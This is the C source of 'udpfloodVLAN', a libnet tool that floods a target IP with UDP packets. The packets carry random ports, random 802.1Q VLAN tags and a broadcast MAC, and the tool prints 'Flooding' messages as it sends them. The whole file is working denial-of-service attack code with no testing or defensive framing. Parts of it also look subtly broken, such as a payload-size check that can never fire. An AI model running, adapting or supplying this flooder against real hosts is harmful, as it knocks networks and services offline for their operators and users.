#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <libnet.h>
#include <signal.h>
#include <arpa/inet.h>

#define VERSION "2.0"
#define MAX_PAYLOAD 65536
#define DEFAULT_PAYLOAD 64

static volatile int keep_running = 1;

void handle_sigint(int sig) {
    keep_running = 0;
}

int main(int argc, char *argv[]) {
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l;
    uint32_t src_ip, dst_ip;
    uint16_t payload_size = DEFAULT_PAYLOAD;
    int count;
    int opt;

    if (argc < 3) {
        fprintf(stderr, "udpfloodVLAN - Version %s\n", VERSION);
        fprintf(stderr, "Usage: %s <target_ip> <count> [-s payload_size]\n", argv[0]);
        fprintf(stderr, "  payload_size: 1-%d (default: %d)\n", MAX_PAYLOAD, DEFAULT_PAYLOAD);
        return 1;
    }

    dst_ip = libnet_name2addr4(NULL, argv[1], LIBNET_DONT_RESOLVE);
    if (dst_ip == -1) {
        fprintf(stderr, "Invalid target IP: %s\n", argv[1]);
        return 1;
    }

    count = atoi(argv[2]);
    if (count <= 0) {
        fprintf(stderr, "Flood Stage (# packets) must be positive\n");
        return 1;
    }

    while ((opt = getopt(argc, argv, "s:")) != -1) {
        switch (opt) {
        case 's':
            payload_size = (uint16_t)atoi(optarg);
            if (payload_size < 1 || payload_size > MAX_PAYLOAD) {
                fprintf(stderr, "Payload size must be 1-%d\n", MAX_PAYLOAD);
                return 1;
            }
            break;
        default:
            fprintf(stderr, "Usage: %s <target_ip> <count> [-s payload_size]\n", argv[0]);
            return 1;
        }
    }

    uint8_t *payload = malloc(payload_size);
    if (!payload) {
        fprintf(stderr, "malloc failure for payload\n");
        return 1;
    }
    memset(payload, 'A', payload_size);

    srand(time(NULL));
    src_ip = rand() | (rand() << 16);

    l = libnet_init(LIBNET_LINK_ADV, NULL, errbuf);
    if (!l) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        free(payload);
        return 1;
    }

    src_ip = libnet_get_ipaddr4(l);
    if (src_ip == -1) {
        src_ip = rand() | (rand() << 16);
    }

    fprintf(stderr, "Flooding %s with %d packets (payload: %d bytes)\n",
            argv[1], count, payload_size);

    signal(SIGINT, handle_sigint);

    int sent = 0;
    static struct libnet_ether_addr *hw_addr;
    hw_addr = libnet_get_hwaddr(l);

    libnet_ptag_t eth_tag = LIBNET_PTAG_INITIALIZER;
    libnet_ptag_t vlan_tag = LIBNET_PTAG_INITIALIZER;
    libnet_ptag_t ip_tag = LIBNET_PTAG_INITIALIZER;
    libnet_ptag_t udp_tag = LIBNET_PTAG_INITIALIZER;

    for (sent = 0; sent < count && keep_running; sent++) {
        uint16_t src_port = 1024 + (rand() % 64511);
        uint16_t dst_port = 1024 + (rand() % 64511);
        uint16_t vlan_id = rand() % 4096;

        if (hw_addr) {
            uint8_t dst_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
            uint8_t src_mac[6];
            memcpy(src_mac, hw_addr->ether_addr_octet, 6);

            udp_tag = libnet_build_udp(src_port, dst_port,
                LIBNET_UDP_H + payload_size, 0,
                payload, payload_size, l, LIBNET_PTAG_INITIALIZER);
            if (udp_tag == -1) {
                fprintf(stderr, "Can't build UDP packet: %s\n", libnet_geterror(l));
                break;
            }

            libnet_toggle_checksum(l, udp_tag, LIBNET_ON);

            ip_tag = libnet_build_ipv4(
                LIBNET_IPV4_H + LIBNET_UDP_H + payload_size,
                0, rand(), 0, 64, IPPROTO_UDP, 0,
                src_ip, dst_ip,
                NULL, 0, l, LIBNET_PTAG_INITIALIZER);
            if (ip_tag == -1) {
                fprintf(stderr, "Can't build IP packet: %s\n", libnet_geterror(l));
                break;
            }

            vlan_tag = libnet_build_802_1q(
                dst_mac, src_mac,
                htons(0x8100), 0, 0, vlan_id,
                htons(0x0800),
                NULL, 0, l, LIBNET_PTAG_INITIALIZER);
            if (vlan_tag == -1) {
                fprintf(stderr, "Can't build 802.1q header: %s\n", libnet_geterror(l));
                break;
            }

            int wrote = libnet_write(l);
            if (wrote == -1) {
                fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
                break;
            }

            libnet_clear_packet(l);
        } else {
            udp_tag = libnet_build_udp(src_port, dst_port,
                LIBNET_UDP_H + payload_size, 0,
                payload, payload_size, l, LIBNET_PTAG_INITIALIZER);
            if (udp_tag == -1) {
                fprintf(stderr, "Can't build UDP packet: %s\n", libnet_geterror(l));
                break;
            }

            libnet_toggle_checksum(l, udp_tag, LIBNET_ON);

            ip_tag = libnet_build_ipv4(
                LIBNET_IPV4_H + LIBNET_UDP_H + payload_size,
                0, rand(), 0, 64, IPPROTO_UDP, 0,
                src_ip, dst_ip,
                NULL, 0, l, LIBNET_PTAG_INITIALIZER);
            if (ip_tag == -1) {
                fprintf(stderr, "Can't build IP packet: %s\n", libnet_geterror(l));
                break;
            }

            int wrote = libnet_write(l);
            if (wrote == -1) {
                fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
                break;
            }

            libnet_clear_packet(l);
        }
    }

    fprintf(stderr, "Sent %d packets\n", sent);

    libnet_destroy(l);
    free(payload);
    return 0;
}
